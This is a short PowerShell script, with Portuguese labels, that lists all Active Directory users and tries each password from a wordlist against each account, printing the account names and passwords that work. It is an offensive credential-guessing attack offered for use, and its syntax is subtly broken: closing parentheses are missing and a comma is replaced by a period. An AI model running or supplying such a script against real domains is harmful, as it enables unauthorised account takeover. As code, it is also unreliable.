dsquery user -limit 0 > users
foreach ($FDN in Get-Content .\users 
{ 
    $results =dsget user $FDN -samid
    $samid = $results[1].replace (" ","")
    Write-host $samid
    foreach ($password in Get-Content .\password.txt 
    {
        $password = $password.replace(" "."")
        dsget user $FDN -u $samid -p $password > $null
        if ($?) {
        Write-host "Conta: $samid Senha: $password"
        }
    }

}
